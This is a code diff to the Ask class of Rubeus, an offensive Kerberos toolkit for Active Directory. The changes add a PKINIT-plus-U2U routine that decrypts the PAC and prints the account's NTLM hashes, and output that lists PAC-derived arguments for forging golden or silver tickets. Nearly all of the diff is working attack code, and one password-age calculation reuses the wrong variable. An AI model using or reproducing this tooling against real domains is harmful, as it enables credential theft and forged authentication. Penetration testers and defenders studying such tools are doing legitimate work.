@@ -1,9 +1,12 @@
 ﻿using System;
 using System.IO;
 using System.Security.Cryptography.X509Certificates;
+using System.Linq;
 using Asn1;
 using Rubeus.lib.Interop;
 using Rubeus.Asn1;
+using Rubeus.Kerberos;
+using Rubeus.Kerberos.PAC;
 
 
 namespace Rubeus {
@@ -29,12 +32,14 @@ namespace Rubeus {
 
     public class Ask
     {
-        public static byte[] TGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool opsec = false)
+        public static byte[] TGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool opsec = false, string servicekey="")
         {
             // send request without Pre-Auth to emulate genuine traffic
             bool preauth = false;
             if (opsec)
+            {
                 preauth = NoPreAuthTGT(userName, domain, keyString, etype, domainController, outfile, ptt, luid, describe, true);
+            }
 
             try
             {
@@ -44,7 +49,7 @@ namespace Rubeus {
                     Console.WriteLine("[*] Using {0} hash: {1}", etype, keyString);               
                     Console.WriteLine("[*] Building AS-REQ (w/ preauth) for: '{0}\\{1}'", domain, userName);
                     AS_REQ userHashASREQ = AS_REQ.NewASReq(userName, domain, keyString, etype, opsec);
-                    return InnerTGT(userHashASREQ, etype, outfile, ptt, domainController, luid, describe, true, opsec);
+                    return InnerTGT(userHashASREQ, etype, outfile, ptt, domainController, luid, describe, true, opsec, servicekey);
                 }
             }
             catch (KerberosErrorException ex)
@@ -76,8 +81,7 @@ namespace Rubeus {
             }
 
             // decode the supplied bytes to an AsnElt object
-            //  false == ignore trailing garbage
-            AsnElt responseAsn = AsnElt.Decode(response, false);
+            AsnElt responseAsn = AsnElt.Decode(response);
 
             // check the response value
             int responseTag = responseAsn.TagValue;
@@ -128,7 +132,7 @@ namespace Rubeus {
             }
         }
 
-        public static byte[] TGT(string userName, string domain, string certFile, string certPass, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verifyCerts = false) {
+        public static byte[] TGT(string userName, string domain, string certFile, string certPass, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verifyCerts = false, string servicekey = "", bool getCredentials = false) {
             try {
                 X509Certificate2 cert;
 
@@ -141,7 +145,7 @@ namespace Rubeus {
                     cert = FindCertificate(certFile, certPass);
                 }
 
-                if(cert == null) {
+                if (cert == null) {
                     Console.WriteLine("[!] Failed to find certificate for {0}", certFile);
                     return null;
                 }
@@ -152,7 +156,7 @@ namespace Rubeus {
                 Console.WriteLine("[*] Building AS-REQ (w/ PKINIT preauth) for: '{0}\\{1}'", domain, userName);
 
                 AS_REQ pkinitASREQ = AS_REQ.NewASReq(userName, domain, cert, agreement, etype, verifyCerts);
-                return InnerTGT(pkinitASREQ, etype, outfile, ptt, domainController, luid, describe, true);
+                return InnerTGT(pkinitASREQ, etype, outfile, ptt, domainController, luid, describe, true, false, servicekey, getCredentials);
 
             } catch (KerberosErrorException ex) {
                 KRB_ERROR error = ex.krbError;
@@ -193,7 +197,7 @@ namespace Rubeus {
             }
         }
 
-        public static byte[] InnerTGT(AS_REQ asReq, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verbose = false, bool opsec = false)
+        public static byte[] InnerTGT(AS_REQ asReq, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verbose = false, bool opsec = false, string serviceKey = "", bool getCredentials = false)
         {
             if ((ulong)luid != 0) {
                 Console.WriteLine("[*] Target LUID : {0}", (ulong)luid);
@@ -212,11 +216,10 @@ namespace Rubeus {
             }
 
             // decode the supplied bytes to an AsnElt object
-            //  false == ignore trailing garbage
             AsnElt responseAsn;
             try
             {
-                responseAsn = AsnElt.Decode(response, false);
+                responseAsn = AsnElt.Decode(response);
             }
             catch(Exception e)
             {
@@ -233,7 +236,7 @@ namespace Rubeus {
                     Console.WriteLine("[+] TGT request successful!");
                 }
 
-                byte[] kirbiBytes = HandleASREP(responseAsn, etype, asReq.keyString, outfile, ptt, luid, describe, verbose, asReq);
+                byte[] kirbiBytes = HandleASREP(responseAsn, etype, asReq.keyString, outfile, ptt, luid, describe, verbose, asReq, serviceKey, getCredentials, dcIP);
 
                 return kirbiBytes;
             }
@@ -249,7 +252,7 @@ namespace Rubeus {
             }
         }
 
-        public static void TGS(KRB_CRED kirbi, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, string outfile = "", bool ptt = false, string domainController = "", bool display = true, bool enterprise = false, bool roast = false, bool opsec = false, KRB_CRED tgs = null, bool usesvcdomain = false)
+        public static void TGS(KRB_CRED kirbi, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, string outfile = "", bool ptt = false, string domainController = "", bool display = true, bool enterprise = false, bool roast = false, bool opsec = false, KRB_CRED tgs = null, string targetDomain = "", string servicekey = "", string asrepkey = "", bool u2u = false, string targetUser = "", bool printargs = false)
         {
             // kirbi            = the TGT .kirbi to use for ticket requests
             // service          = the SPN being requested
@@ -271,12 +274,12 @@ namespace Rubeus {
             foreach (string sname in services)
             {
                 // request the new service ticket
-                TGS(userName, domain, ticket, clientKey, paEType, sname, requestEType, outfile, ptt, domainController, display, enterprise, roast, opsec, tgs, usesvcdomain);
+                TGS(userName, domain, ticket, clientKey, paEType, sname, requestEType, outfile, ptt, domainController, display, enterprise, roast, opsec, tgs, targetDomain, servicekey, asrepkey, u2u, targetUser, printargs);
                 Console.WriteLine();
             }
         }
 
-        public static byte[] TGS(string userName, string domain, Ticket providedTicket, byte[] clientKey, Interop.KERB_ETYPE paEType, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, string outfile = "", bool ptt = false, string domainController = "", bool display = true, bool enterprise = false, bool roast = false, bool opsec = false, KRB_CRED tgs = null, bool usesvcdomain = false)
+        public static byte[] TGS(string userName, string domain, Ticket providedTicket, byte[] clientKey, Interop.KERB_ETYPE paEType, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, string outfile = "", bool ptt = false, string domainController = "", bool display = true, bool enterprise = false, bool roast = false, bool opsec = false, KRB_CRED tgs = null, string targetDomain = "", string servicekey = "", string asrepkey = "", bool u2u = false, string targetUser = "", bool printargs = false)
         {
             string dcIP = Networking.GetDCIP(domainController, display);
             if (String.IsNullOrEmpty(dcIP)) { return null; }
@@ -292,10 +295,20 @@ namespace Rubeus {
                     Console.WriteLine("[*] Requesting '{0}' etype for the service ticket", requestEType);
                 }
 
-                Console.WriteLine("[*] Building TGS-REQ request for: '{0}'", service);
+                if (!String.IsNullOrEmpty(service))
+                    Console.WriteLine("[*] Building TGS-REQ request for: '{0}'", service);
+                else if (u2u)
+                    Console.WriteLine("[*] Building User-to-User TGS-REQ request for: '{0}'", userName);
+                else
+                    Console.WriteLine("[*] Building TGS-REQ request");
+
             }
 
-            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, service, providedTicket, clientKey, paEType, requestEType, false, "", enterprise, roast, opsec, false, tgs, usesvcdomain);
+            // if /service is empty get name from the supplied /tgs
+            if (u2u && tgs != null && String.IsNullOrEmpty(service))
+                service = tgs.enc_part.ticket_info[0].pname.name_string[0];
+
+            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, service, providedTicket, clientKey, paEType, requestEType, false, targetUser, enterprise, roast, opsec, false, tgs, targetDomain, u2u);
 
             byte[] response = Networking.SendBytes(dcIP, 88, tgsBytes);
             if (response == null)
@@ -305,7 +318,7 @@ namespace Rubeus {
 
             // decode the supplied bytes to an AsnElt object
             //  false == ignore trailing garbage
-            AsnElt responseAsn = AsnElt.Decode(response, false);
+            AsnElt responseAsn = AsnElt.Decode(response);
 
             // check the response value
             int responseTag = responseAsn.TagValue;
@@ -322,7 +335,7 @@ namespace Rubeus {
 
                 // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
                 byte[] outBytes = Crypto.KerberosDecrypt(paEType, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);
-                AsnElt ae = AsnElt.Decode(outBytes, false);
+                AsnElt ae = AsnElt.Decode(outBytes);
                 EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);
 
                 // if using /opsec and the ticket is for a server configuration for unconstrained delegation, request a forwardable TGT
@@ -388,6 +401,9 @@ namespace Rubeus {
                     LSA.ImportTicket(kirbiBytes, new LUID());
                 }
 
+                if (String.IsNullOrEmpty(servicekey) && u2u)
+                    servicekey = Helpers.ByteArrayToString(clientKey);
+
                 if (display)
                 {
                     Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);
@@ -406,7 +422,9 @@ namespace Rubeus {
                     }
 
                     KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
-                    LSA.DisplayTicket(kirbi);
+
+                    LSA.DisplayTicket(kirbi, 2, false, false, false, false, 
+                        string.IsNullOrEmpty(servicekey) ? null : Helpers.StringToByteArray(servicekey), string.IsNullOrEmpty(asrepkey) ? null : Helpers.StringToByteArray(asrepkey));
                 }
 
                 if (!String.IsNullOrEmpty(outfile))
@@ -419,6 +437,80 @@ namespace Rubeus {
                             Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", outfile);
                         }
                     }
+                }
+
+                if (!String.IsNullOrEmpty(servicekey) && printargs)
+                {
+                    var decryptedEncTicket = cred.tickets[0].Decrypt(Helpers.StringToByteArray(servicekey), null);
+                    PACTYPE pt = decryptedEncTicket.GetPac(null);
+                    if (pt == null)
+                    {
+                        Console.WriteLine("[X] Unable to get the PAC");
+                        return kirbiBytes;
+                    }
+
+                    string outArgs = String.Empty;
+
+                    foreach (var pacInfoBuffer in pt.PacInfoBuffers)
+                    {
+                        if (pacInfoBuffer is LogonInfo li)
+                        {
+                            outArgs = String.Format("/user:{0} /id:{1} /pgid:{2} /logoncount:{3} /badpwdcount:{4} /sid:{5} /netbios:{6}", li.KerbValidationInfo.EffectiveName, li.KerbValidationInfo.UserId, li.KerbValidationInfo.PrimaryGroupId, li.KerbValidationInfo.LogonCount, li.KerbValidationInfo.BadPasswordCount, li.KerbValidationInfo.LogonDomainId.GetValue(), li.KerbValidationInfo.LogonDomainName);
+                            if (!String.IsNullOrEmpty(li.KerbValidationInfo.FullName.ToString()))
+                                outArgs = String.Format("{0} /displayname:\"{1}\"", outArgs, li.KerbValidationInfo.FullName);
+                            if (!String.IsNullOrEmpty(li.KerbValidationInfo.LogonScript.ToString()))
+                                outArgs = String.Format("{0} /scriptpath:\"{1}\"", outArgs, li.KerbValidationInfo.LogonScript);
+                            if (!String.IsNullOrEmpty(li.KerbValidationInfo.ProfilePath.ToString()))
+                                outArgs = String.Format("{0} /profilepath:\"{1}\"", outArgs, li.KerbValidationInfo.ProfilePath);
+                            if (!String.IsNullOrEmpty(li.KerbValidationInfo.HomeDirectory.ToString()))
+                                outArgs = String.Format("{0} /homedir:\"{1}\"", outArgs, li.KerbValidationInfo.HomeDirectory);
+                            if (!String.IsNullOrEmpty(li.KerbValidationInfo.HomeDirectoryDrive.ToString()))
+                                outArgs = String.Format("{0} /homedrive:\"{1}\"", outArgs, li.KerbValidationInfo.HomeDirectoryDrive);
+                            if (li.KerbValidationInfo.GroupCount > 0)
+                                outArgs = String.Format("{0} /groups:{1}", outArgs, li.KerbValidationInfo.GroupIds?.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
+                            if (li.KerbValidationInfo.SidCount > 0)
+                                outArgs = String.Format("{0} /sids:{1}", outArgs, li.KerbValidationInfo.ExtraSids.GetValue().Select(s => s.Sid.ToString()).Aggregate((cur, next) => cur + "," + next));
+                            if (li.KerbValidationInfo.ResourceGroupCount > 0)
+                                outArgs = String.Format("{0} /resourcegroupsid:{1} /resourcegroups:{2}", outArgs, li.KerbValidationInfo.ResourceGroupDomainSid.GetValue().ToString(), li.KerbValidationInfo.ResourceGroupIds.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
+                            try
+                            {
+                                outArgs = String.Format("{0} /logofftime:\"{1}\"", outArgs, DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.LogoffTime.LowDateTime | ((long)li.KerbValidationInfo.LogoffTime.HighDateTime << 32)).ToLocalTime());
+                            }
+                            catch { }
+                            DateTime? passLastSet = null;
+                            try
+                            {
+                                passLastSet = DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.PasswordLastSet.LowDateTime | ((long)li.KerbValidationInfo.PasswordLastSet.HighDateTime << 32));
+                            }
+                            catch { }
+                            if (passLastSet != null)
+                            {
+                                outArgs = String.Format("{0} /pwdlastset:\"{1}\"", outArgs, ((DateTime)passLastSet).ToLocalTime());
+                                DateTime? passCanSet = null;
+                                try
+                                {
+                                    passCanSet = DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.PasswordCanChange.LowDateTime | ((long)li.KerbValidationInfo.PasswordCanChange.HighDateTime << 32));
+                                }
+                                catch { }
+                                if (passCanSet != null)
+                                    outArgs = String.Format("{0} /minpassage:{1}d", outArgs, (((DateTime)passCanSet) - ((DateTime)passLastSet)).Days);
+                                DateTime? passMustSet = null;
+                                try
+                                {
+                                    passCanSet = DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.PasswordMustChange.LowDateTime | ((long)li.KerbValidationInfo.PasswordMustChange.HighDateTime << 32));
+                                }
+                                catch { }
+                                if (passMustSet != null)
+                                    outArgs = String.Format("{0} /maxpassage:{1}d", outArgs, (((DateTime)passMustSet) - ((DateTime)passLastSet)).Days);
+                            }
+                            if (!String.IsNullOrEmpty(li.KerbValidationInfo.LogonServer.ToString()))
+                                outArgs = String.Format("{0} /dc:{1}.{2}", outArgs, li.KerbValidationInfo.LogonServer.ToString(), cred.tickets[0].realm);
+                            if ((Interop.PacUserAccountControl)li.KerbValidationInfo.UserAccountControl != Interop.PacUserAccountControl.NORMAL_ACCOUNT)
+                                outArgs = String.Format("{0} /uac:{1}", outArgs, String.Format("{0}", (Interop.PacUserAccountControl)li.KerbValidationInfo.UserAccountControl).Replace(" ", ""));
+                        }
+                    }
+
+                    Console.WriteLine("\r\n[*] Printing argument list for use with Rubeus' 'golden' or 'silver' commands:\r\n\r\n{0}\r\n", outArgs);
                 }
 
                 return kirbiBytes;
@@ -436,7 +528,7 @@ namespace Rubeus {
             return null;
         }
 
-        private static byte[] HandleASREP(AsnElt responseAsn, Interop.KERB_ETYPE etype, string keyString, string outfile, bool ptt, LUID luid = new LUID(), bool describe = false, bool verbose = false, AS_REQ asReq = null)
+        private static byte[] HandleASREP(AsnElt responseAsn, Interop.KERB_ETYPE etype, string keyString, string outfile, bool ptt, LUID luid = new LUID(), bool describe = false, bool verbose = false, AS_REQ asReq = null, string serviceKey = "", bool getCredentials = false, string dcIP = "")
         {
             // parse the response to an AS-REP
             AS_REP rep = new AS_REP(responseAsn);
@@ -482,8 +574,7 @@ namespace Rubeus {
                 throw new RubeusException("[X] Encryption type \"" + etype + "\" not currently supported");
             }
 
-
-            AsnElt ae = AsnElt.Decode(outBytes, false);
+            AsnElt ae = AsnElt.Decode(outBytes);
 
             EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);
 
@@ -575,7 +666,88 @@ namespace Rubeus {
             if (describe)
             {
                 KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
-                LSA.DisplayTicket(kirbi);
+                LSA.DisplayTicket(kirbi, 2, false, false, false, false, string.IsNullOrEmpty(serviceKey) ? null : Helpers.StringToByteArray(serviceKey), key);
+            }
+
+            if (getCredentials)
+            {
+                Console.WriteLine("[*] Getting credentials using U2U\r\n");
+                byte[] u2uBytes = TGS_REQ.NewTGSReq(info.pname.name_string[0], info.prealm, info.pname.name_string[0], cred.tickets[0], info.key.keyvalue, (Interop.KERB_ETYPE)info.key.keytype, Interop.KERB_ETYPE.subkey_keymaterial, false, String.Empty, false, false, false, false, cred, "", true);
+                byte[] u2uResponse = Networking.SendBytes(dcIP, 88, u2uBytes);
+                if (u2uResponse == null)
+                {
+                    return null;
+                }
+                AsnElt u2uResponseAsn = AsnElt.Decode(u2uResponse);
+
+                // check the response value
+                int responseTag = u2uResponseAsn.TagValue;
+
+                if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)
+                {
+                    // parse the response to an TGS-REP and get the PAC
+                    TGS_REP u2uRep = new TGS_REP(u2uResponseAsn);
+                    EncTicketPart u2uEncTicketPart = u2uRep.ticket.Decrypt(info.key.keyvalue, key);
+                    PACTYPE pt = u2uEncTicketPart.GetPac(key);
+
+                    // look for the credential information and print
+                    foreach (var pacInfoBuffer in pt.PacInfoBuffers)
+                    {
+                        if (pacInfoBuffer is PacCredentialInfo ci)
+                        {
+
+                            Console.WriteLine("  CredentialInfo         :");
+                            Console.WriteLine("    Version              : {0}", ci.Version);
+                            Console.WriteLine("    EncryptionType       : {0}", ci.EncryptionType);
+
+                            if (ci.CredentialInfo.HasValue)
+                            {
+
+                                Console.WriteLine("    CredentialData       :");
+                                Console.WriteLine("      CredentialCount    : {0}", ci.CredentialInfo.Value.CredentialCount);
+
+                                foreach (var credData in ci.CredentialInfo.Value.Credentials)
+                                {
+                                    string hash = "";
+                                    if ("NTLM".Equals(credData.PackageName.ToString()))
+                                    {
+                                        int version = BitConverter.ToInt32((byte[])(Array)credData.Credentials, 0);
+                                        int flags = BitConverter.ToInt32((byte[])(Array)credData.Credentials, 4);
+                                        if (flags == 3)
+                                        {
+                                            hash = String.Format("{0}:{1}", Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(8).Take(16).ToArray()), Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(24).Take(16).ToArray()));
+                                        }
+                                        else
+                                        {
+                                            hash = String.Format("{0}", Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(24).Take(16).ToArray()));
+                                        }
+                                    }
+                                    else
+                                    {
+                                        hash = Helpers.ByteArrayToString((byte[])(Array)credData.Credentials);
+                                    }
+
+                                    Console.WriteLine("       {0}              : {1}", credData.PackageName, hash);
+                                }
+
+                            }
+                            else
+                            {
+                                Console.WriteLine("    CredentialData    :   *** NO KEY ***");
+                            }
+                        }
+                    }
+                }
+                else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
+                {
+                    // parse the response to an KRB-ERROR
+                    KRB_ERROR error = new KRB_ERROR(u2uResponseAsn.Sub[0]);
+                    Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
+                }
+                else
+                {
+                    Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
+                }
             }
 
             return kirbiBytes;
